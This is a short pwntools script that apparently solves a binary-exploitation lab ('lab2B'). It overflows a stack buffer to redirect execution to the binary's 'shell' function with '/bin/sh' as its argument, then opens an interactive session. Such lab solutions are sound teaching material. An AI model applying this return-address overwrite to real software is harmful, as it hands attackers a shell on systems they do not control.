from pwn import *
chall = ELF("./lab2B")
win = p32(chall.symbols["shell"])
binsh = p32(list(chall.search(b"/bin/sh"))[0])

payload = b"a" * 0x17 + b"aaaa" + win + b"aaaa" + binsh

s = process(executable = "./lab2B", argv = [b"2", payload])
gdbscripter = '''
bp 0x080486FC
'''
#s = gdb.debug(args = ["1", payload], exe = "./lab2B", gdbscript = gdbscripter)
s.interactive()
